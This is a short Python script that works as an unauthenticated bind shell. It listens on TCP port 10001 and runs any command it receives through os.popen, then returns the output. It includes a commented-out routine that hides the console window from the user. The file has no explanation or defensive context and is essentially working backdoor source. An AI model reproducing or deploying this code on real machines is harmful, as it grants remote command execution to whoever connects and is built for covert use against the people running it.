import socket
import os
#import ctypes


'''def hidewindow():
	whnd=ctypes.windll.kernel32.GetConsoleWindow()
	if whnd!=0:
		ctypes.windll.user32.ShowWindow(whnd,0)
		ctypes.windll.kernel32.CloseHandle(whnd)'''

	
def gethostip():
	s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	try:
		s.connect(('8.8.8.8',80))
		hostip=s.getsockname()[0]
	finally:
		s.close()
	return hostip
	
	
	
def tServer(hostip):
    i=0
    s=socket.socket()
    addr=hostip
    port=10001
    s.bind((addr,port))
    s.listen(1)
    while(1):
        (conn,addr)=s.accept()
        
        
        bcmd=conn.recv(255)
        cmd=str(bcmd,encoding="utf-8")
        
        print(addr)
        
        echo=os.popen(cmd)
        becho=bytes(echo.read(),encoding="utf-8")
        conn.send(becho)
        
        
        conn.close()
        
        
        i=i+1
        if i==3:
            break
    s.close()

#hidewindow()  
hostip=gethostip()
tServer(hostip)
